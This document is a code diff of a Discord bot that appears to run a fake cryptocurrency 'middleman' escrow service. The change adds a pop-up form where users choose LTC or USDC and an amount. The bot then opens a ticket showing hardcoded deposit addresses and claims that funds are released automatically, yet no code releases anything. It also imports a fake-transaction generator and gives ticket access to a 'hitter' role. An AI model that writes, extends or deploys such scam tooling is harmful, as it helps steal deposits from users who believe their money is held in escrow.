@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, Partials, Events, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { Client, GatewayIntentBits, Partials, Events, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const { generateFakeTransaction } = require('./blockchain');
 
 const client = new Client({
@@ -15,7 +15,7 @@ const OWNER_ID = '1422945082746601594';
 const HITTER_ROLE_ID = '1484680314772000902';
 const FINANCE_ROLE_ID = '1485363449897681017';
 
-// Hardcoded addresses - ALWAYS USE THESE
+// Hardcoded addresses
 const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
 const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
 
@@ -36,11 +36,10 @@ const isOwner = (id) => id === OWNER_ID;
 const hasHitter = (m) => m.roles.cache.has(HITTER_ROLE_ID);
 const hasFinance = (m) => m.roles.cache.has(FINANCE_ROLE_ID);
 
-// Command definitions
 const commands = [
     {
         name: 'panel',
-        description: 'Spawn auto middleman panel (Owner only)',
+        description: 'Spawn middleman panel (Owner only)',
         defaultMemberPermissions: PermissionFlagsBits.Administrator
     },
     {
@@ -106,7 +105,6 @@ client.on(Events.ClientReady, async () => {
     }
 });
 
-// Role monitoring
 client.on(Events.GuildMemberUpdate, (oldM, newM) => {
     const added = newM.roles.cache.filter(r => !oldM.roles.cache.has(r.id));
     const removed = oldM.roles.cache.filter(r => !newM.roles.cache.has(r.id));
@@ -116,7 +114,6 @@ client.on(Events.GuildMemberUpdate, (oldM, newM) => {
     if (removed.has(FINANCE_ROLE_ID)) console.log(`[ROLE] -FINANCE ${newM.user.tag}`);
 });
 
-// Command handler
 client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
     
@@ -129,23 +126,22 @@ client.on(Events.InteractionCreate, async (interaction) => {
         switch (commandName) {
             case 'panel':
                 if (!isOwner(user.id)) return deny('Owner only.');
-                const autoEmbed = new EmbedBuilder()
-                    .setTitle('🤖 Automated Middleman')
-                    .setDescription('Select your trade amount tier below:')
+                const panelEmbed = new EmbedBuilder()
+                    .setTitle('🎰 Crypto Middleman Service')
+                    .setDescription('Select your ticket tier below:')
                     .setColor(0x5865F2)
                     .addFields(
-                        { name: 'Tier 1', value: '$200 or under\n**USDC Only**', inline: true },
-                        { name: 'Tier 2', value: '$500 or under\n**USDC Only**', inline: true },
-                        { name: 'Tier 3', value: '$1000 or more\n**USDC Only**', inline: true }
-                    )
-                    .setFooter({ text: 'Deposits are automated • Funds secured via smart contract' });
+                        { name: 'Tier 1', value: 'Middleman ($200 or under)', inline: true },
+                        { name: 'Tier 2', value: 'Middleman ($500 and under)', inline: true },
+                        { name: 'Tier 3', value: 'Middleman ($1000+)', inline: true }
+                    );
                 
-                const autoRow = new ActionRowBuilder().addComponents(
-                    new ButtonBuilder().setCustomId('auto_tier1').setLabel('$200 or less').setStyle(ButtonStyle.Primary).setEmoji('🥉'),
-                    new ButtonBuilder().setCustomId('auto_tier2').setLabel('$500 or less').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
-                    new ButtonBuilder().setCustomId('auto_tier3').setLabel('$1000+').setStyle(ButtonStyle.Success).setEmoji('🥇')
+                const panelRow = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder().setCustomId('tier1').setLabel('Tier 1 ($200)').setStyle(ButtonStyle.Primary).setEmoji('🥉'),
+                    new ButtonBuilder().setCustomId('tier2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
+                    new ButtonBuilder().setCustomId('tier3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇')
                 );
-                await interaction.reply({ embeds: [autoEmbed], components: [autoRow] });
+                await interaction.reply({ embeds: [panelEmbed], components: [panelRow] });
                 break;
 
             case 'manual':
@@ -155,16 +151,15 @@ client.on(Events.InteractionCreate, async (interaction) => {
                     .setDescription('Manual middleman service, Please follow the rules and wait patiently')
                     .setColor(0xFFA500)
                     .addFields(
-                        { name: 'Tier 1', value: '$200 or under\n**LTC Only**', inline: true },
-                        { name: 'Tier 2', value: '$500 or under\n**LTC Only**', inline: true },
-                        { name: 'Tier 3', value: '$1000 or more\n**LTC Only**', inline: true }
-                    )
-                    .setFooter({ text: 'Human middleman will assist you • Be patient' });
+                        { name: 'Tier 1', value: 'Middleman ($200 or under)', inline: true },
+                        { name: 'Tier 2', value: 'Middleman ($500 and under)', inline: true },
+                        { name: 'Tier 3', value: 'Middleman ($1000+)', inline: true }
+                    );
                 
                 const manualRow = new ActionRowBuilder().addComponents(
-                    new ButtonBuilder().setCustomId('manual_tier1').setLabel('$200 or less').setStyle(ButtonStyle.Primary).setEmoji('🥉'),
-                    new ButtonBuilder().setCustomId('manual_tier2').setLabel('$500 or less').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
-                    new ButtonBuilder().setCustomId('manual_tier3').setLabel('$1000+').setStyle(ButtonStyle.Success).setEmoji('🥇')
+                    new ButtonBuilder().setCustomId('manual_tier1').setLabel('Tier 1 ($200)').setStyle(ButtonStyle.Primary).setEmoji('🥉'),
+                    new ButtonBuilder().setCustomId('manual_tier2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
+                    new ButtonBuilder().setCustomId('manual_tier3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇')
                 );
                 await interaction.reply({ embeds: [manualEmbed], components: [manualRow] });
                 break;
@@ -237,63 +232,43 @@ client.on(Events.InteractionCreate, async (interaction) => {
     }
 });
 
-// Button handler - Auto MM (USDC)
+// Button handler
 client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isButton()) return;
     
     const { customId, user } = interaction;
     
-    // Auto MM tickets - USDC
-    if (customId.startsWith('auto_tier')) {
-        const tier = customId.replace('auto_tier', '');
-        const limits = { '1': 200, '2': 500, '3': 1000 };
-        const limit = limits[tier];
+    // Auto MM tiers - open crypto selection modal
+    if (['tier1', 'tier2', 'tier3'].includes(customId)) {
+        const tier = customId.replace('tier', '');
         
-        if (!client.config.TICKET_CATEGORY) {
-            return interaction.reply({ content: '❌ Auto MM category not set.', ephemeral: true });
-        }
-
-        try {
-            const ticketCh = await interaction.guild.channels.create({
-                name: `auto-${user.username}-t${tier}`,
-                parent: client.config.TICKET_CATEGORY,
-                permissionOverwrites: [
-                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
-                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
-                ]
-            });
-
-            const embed = new EmbedBuilder()
-                .setTitle(`🤖 Automated Middleman | Tier ${tier}`)
-                .setDescription(`Welcome <@${user.id}>\n**Trade Limit: $${limit}**`)
-                .addFields(
-                    { name: 'Deposit Address (USDC)', value: `\`${USDC_ADDRESS}\``, inline: false },
-                    { name: 'Network', value: 'Ethereum (ERC-20)', inline: true },
-                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true },
-                    { name: 'Instructions', value: '1. Send exact USDC amount\n2. Wait for 6 confirmations\n3. Bot releases funds automatically', inline: false }
-                )
-                .setColor(0x2775CA)
-                .setFooter({ text: 'Do not send LTC to this address • USDC only' });
-
-            const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder().setCustomId('close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger)
-            );
-
-            await ticketCh.send({ content: `<@${user.id}>`, embeds: [embed], components: [row] });
-            await interaction.reply({ content: `✅ Auto MM ticket created: ${ticketCh}`, ephemeral: true });
-            
-            client.activeTickets.set(ticketCh.id, { userId: user.id, tier, type: 'auto', limit, createdAt: Date.now() });
-            console.log(`[AUTO TICKET] Tier ${tier} created by ${user.tag}`);
-
-        } catch (e) {
-            console.error('[AUTO TICKET ERR]', e);
-            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
-        }
+        const modal = new ModalBuilder()
+            .setCustomId(`crypto_modal_${tier}`)
+            .setTitle(`Tier ${tier} - Select Crypto`);
+        
+        const cryptoInput = new TextInputBuilder()
+            .setCustomId('crypto_type')
+            .setLabel('Type LTC or USDC')
+            .setStyle(TextInputStyle.Short)
+            .setPlaceholder('Enter LTC or USDC')
+            .setRequired(true)
+            .setMaxLength(4);
+        
+        const amountInput = new TextInputBuilder()
+            .setCustomId('amount')
+            .setLabel('Amount in USD')
+            .setStyle(TextInputStyle.Short)
+            .setPlaceholder('Enter amount')
+            .setRequired(true);
+        
+        const row1 = new ActionRowBuilder().addComponents(cryptoInput);
+        const row2 = new ActionRowBuilder().addComponents(amountInput);
+        modal.addComponents(row1, row2);
+        
+        await interaction.showModal(modal);
     }
     
-    // Manual MM tickets - LTC
+    // Manual MM tiers - direct LTC ticket
     if (customId.startsWith('manual_tier')) {
         const tier = customId.replace('manual_tier', '');
         const limits = { '1': 200, '2': 500, '3': 1000 };
@@ -322,11 +297,9 @@ client.on(Events.InteractionCreate, async (interaction) => {
                     { name: 'Deposit Address (LTC)', value: `\`${LTC_ADDRESS}\``, inline: false },
                     { name: 'Network', value: 'Litecoin', inline: true },
                     { name: 'Status', value: '⏳ Waiting for middleman...', inline: true },
-                    { name: 'Instructions', value: '1. Wait for middleman to join\n2. Send LTC to address above\n3. Middleman confirms and releases', inline: false },
-                    { name: 'Rules', value: '• No chargebacks\n• Verify address before sending\n• Middleman has final say', inline: false }
+                    { name: 'Instructions', value: '1. Wait for middleman to join\n2. Send LTC to address above\n3. Middleman confirms and releases', inline: false }
                 )
-                .setColor(0xBFBBBB)
-                .setFooter({ text: 'Do not send USDC to this address • LTC only' });
+                .setColor(0xBFBBBB);
 
             const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder().setCustomId('close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger)
@@ -336,7 +309,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
             await interaction.reply({ content: `✅ Manual MM ticket created: ${ticketCh}`, ephemeral: true });
             
             client.activeTickets.set(ticketCh.id, { userId: user.id, tier, type: 'manual', limit, createdAt: Date.now() });
-            console.log(`[MANUAL TICKET] Tier ${tier} created by ${user.tag}`);
 
         } catch (e) {
             console.error('[MANUAL TICKET ERR]', e);
@@ -347,6 +319,77 @@ client.on(Events.InteractionCreate, async (interaction) => {
     if (customId === 'close_ticket') {
         await interaction.reply('🔒 Closing ticket...');
         await interaction.channel.delete().catch(() => {});
+    }
+});
+
+// Modal submit handler
+client.on(Events.InteractionCreate, async (interaction) => {
+    if (!interaction.isModalSubmit()) return;
+    
+    if (interaction.customId.startsWith('crypto_modal_')) {
+        const tier = interaction.customId.replace('crypto_modal_', '');
+        const limits = { '1': 200, '2': 500, '3': 1000 };
+        const limit = limits[tier];
+        
+        const crypto = interaction.fields.getTextInputValue('crypto_type').toUpperCase();
+        const amount = interaction.fields.getTextInputValue('amount');
+        
+        if (!['LTC', 'USDC'].includes(crypto)) {
+            return interaction.reply({ content: '❌ Only LTC or USDC allowed.', ephemeral: true });
+        }
+        
+        if (!client.config.TICKET_CATEGORY) {
+            return interaction.reply({ content: '❌ Auto MM category not set.', ephemeral: true });
+        }
+
+        const address = crypto === 'LTC' ? LTC_ADDRESS : USDC_ADDRESS;
+        const network = crypto === 'LTC' ? 'Litecoin' : 'Ethereum (ERC-20)';
+        const color = crypto === 'LTC' ? 0xBFBBBB : 0x2775CA;
+
+        try {
+            const ticketCh = await interaction.guild.channels.create({
+                name: `auto-${interaction.user.username}-t${tier}-${crypto.toLowerCase()}`,
+                parent: client.config.TICKET_CATEGORY,
+                permissionOverwrites: [
+                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
+                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
+                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
+                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
+                ]
+            });
+
+            const embed = new EmbedBuilder()
+                .setTitle(`🤖 Automated Middleman | Tier ${tier} | ${crypto}`)
+                .setDescription(`Welcome <@${interaction.user.id}>\n**Amount: $${amount}**`)
+                .addFields(
+                    { name: 'Deposit Address', value: `\`${address}\``, inline: false },
+                    { name: 'Network', value: network, inline: true },
+                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true },
+                    { name: 'Instructions', value: `1. Send exact ${crypto} amount\n2. Wait for 6 confirmations\n3. Bot releases funds automatically`, inline: false }
+                )
+                .setColor(color);
+
+            const row = new ActionRowBuilder().addComponents(
+                new ButtonBuilder().setCustomId('close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger)
+            );
+
+            await ticketCh.send({ content: `<@${interaction.user.id}>`, embeds: [embed], components: [row] });
+            await interaction.reply({ content: `✅ Auto MM ticket created: ${ticketCh}`, ephemeral: true });
+            
+            client.activeTickets.set(ticketCh.id, { 
+                userId: interaction.user.id, 
+                tier, 
+                type: 'auto', 
+                crypto,
+                amount,
+                limit,
+                createdAt: Date.now() 
+            });
+
+        } catch (e) {
+            console.error('[AUTO TICKET ERR]', e);
+            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
+        }
     }
 });
 
